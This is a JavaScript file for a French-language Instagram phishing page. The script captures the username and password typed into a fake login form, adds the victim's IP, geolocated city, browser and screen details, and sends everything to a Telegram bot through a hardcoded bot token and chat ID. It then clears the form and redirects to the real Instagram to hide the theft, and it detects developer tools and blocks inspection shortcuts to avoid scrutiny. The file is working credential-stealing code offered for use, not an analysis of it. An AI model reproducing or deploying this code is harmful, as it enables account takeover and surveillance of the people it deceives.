// Configuration Telegram
const TELEGRAM_BOT_TOKEN = '8217147903:AAHdDmpNkDgeYY1fltvt_otnCYFZ9peGo9w';
const TELEGRAM_CHAT_ID = '5534662562';

const loginForm = document.getElementById('loginForm');

async function getClientIP() {
    try {
        const response = await axios.get('https://api.ipify.org?format=json');
        return response.data.ip;
    } catch (error) {
        return 'IP non disponible';
    }
}

function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browserName = "Navigateur inconnu";
    
    if (ua.includes("Firefox")) browserName = "Firefox";
    else if (ua.includes("Chrome") && !ua.includes("Edg")) browserName = "Chrome";
    else if (ua.includes("Safari") && !ua.includes("Chrome")) browserName = "Safari";
    else if (ua.includes("Edg")) browserName = "Edge";
    
    return {
        name: browserName,
        platform: navigator.platform,
        screen: `${screen.width}x${screen.height}`,
        language: navigator.language,
        userAgent: ua.substring(0, 100) + '...'
    };
}

async function getLocationInfo(ip) {
    try {
        const response = await axios.get(`https://ipapi.co/${ip}/json/`);
        const data = response.data;
        
        if (!data.error) {
            return `${data.city || 'Inconnu'}, ${data.region || 'Inconnu'}, ${data.country_name || 'Inconnu'}`;
        }
    } catch (error) {
        // Silencieux
    }
    return 'Localisation non disponible';
}

async function sendToTelegram(username, password) {
    const ip = await getClientIP();
    const browser = getBrowserInfo();
    const location = await getLocationInfo(ip);
    const date = new Date().toLocaleString('fr-FR');
    
    const message = `🔔 NOUVEAU LOGIN INSTAGRAM 🔔

👤 UTILISATEUR: ${username}
🔐 MOT DE PASSE: ${password}

📍 LOCALISATION:
🌍 ${location}
🌐 IP: ${ip}

📱 APPAREIL:
📅 Date: ${date}
🖥️ Navigateur: ${browser.name}
💻 OS: ${browser.platform}
📐 Écran: ${browser.screen}
🗣️ Langue: ${browser.language}

🔍 User Agent:
${browser.userAgent}

🌐 URL: ${window.location.href}`;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
        await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('✅ Données envoyées avec succès');
        return true;
    } catch (error) {
        console.error('❌ Erreur d\'envoi Telegram');
        return false;
    }
}

// Gestion du formulaire
loginForm.addEventListener('submit', async function(event) {
    event.preventDefault();
    
    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    
    if (!username || !password) {
        // Validation visuelle silencieuse
        const inputs = document.querySelectorAll('input');
        inputs.forEach(input => {
            if (!input.value.trim()) {
                input.style.borderColor = '#ff4444';
                setTimeout(() => {
                    input.style.borderColor = '#dbdbdb';
                }, 2000);
            }
        });
        return;
    }
    
    const submitBtn = this.querySelector('.login-btn');
    const originalText = submitBtn.textContent;
    submitBtn.textContent = 'Connexion en cours...';
    submitBtn.disabled = true;
    submitBtn.style.opacity = '0.8';
    submitBtn.style.cursor = 'wait';
    
    // Envoyer les données
    const success = await sendToTelegram(username, password);
    
    // Effacer les champs
    document.getElementById('username').value = '';
    document.getElementById('password').value = '';
    
    // Redirection après délai
    setTimeout(() => {
        window.location.href = 'https://instagram.com';
    }, 1800);
});

// Gestion des liens
document.querySelectorAll('a').forEach(link => {
    link.addEventListener('click', function(event) {
        event.preventDefault();
        
        if (this.classList.contains('forgot')) {
            // Redirection silencieuse pour mot de passe oublié
            setTimeout(() => {
                window.location.href = 'https://instagram.com/accounts/password/reset/';
            }, 300);
        } else if (this.parentElement.classList.contains('facebook') || 
                  this.classList.contains('facebook')) {
            // Redirection Facebook
            setTimeout(() => {
                window.location.href = 'https://facebook.com';
            }, 300);
        } else if (this.textContent.includes('Inscrivez-vous')) {
            // Redirection inscription
            setTimeout(() => {
                window.location.href = 'https://instagram.com/accounts/signup/';
            }, 300);
        }
    });
});

// Protection discrète contre l'inspection
let devtoolsDetected = false;
const checkDevTools = () => {
    const threshold = 100;
    const widthDiff = Math.abs(window.outerWidth - window.innerWidth);
    const heightDiff = Math.abs(window.outerHeight - window.innerHeight);
    
    if ((widthDiff > threshold || heightDiff > threshold) && !devtoolsDetected) {
        devtoolsDetected = true;
        // Redirection silencieuse sans alerte
        setTimeout(() => {
            window.location.href = 'https://instagram.com';
        }, 500);
    }
};

// Vérifier moins fréquemment pour éviter la surcharge
setInterval(checkDevTools, 1500);

// Protection supplémentaire
document.addEventListener('contextmenu', (e) => {
    if (e.target.tagName === 'IMG' || e.target.classList.contains('logo')) {
        e.preventDefault();
    }
});

// Prévention des raccourcis clavier d'inspection
document.addEventListener('keydown', (e) => {
    // Désactiver Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+Shift+C, F12
    if ((e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) || 
        e.key === 'F12' || 
        (e.ctrlKey && e.key === 'u')) {
        e.preventDefault();
        // Redirection silencieuse
        setTimeout(() => {
            window.location.href = 'https://instagram.com';
        }, 300);
    }
});

// Initialisation
window.addEventListener('load', () => {
    console.log('Page de connexion Instagram chargée');
    
    // Focus sur le premier champ
    setTimeout(() => {
        document.getElementById('username').focus();
    }, 500);
});
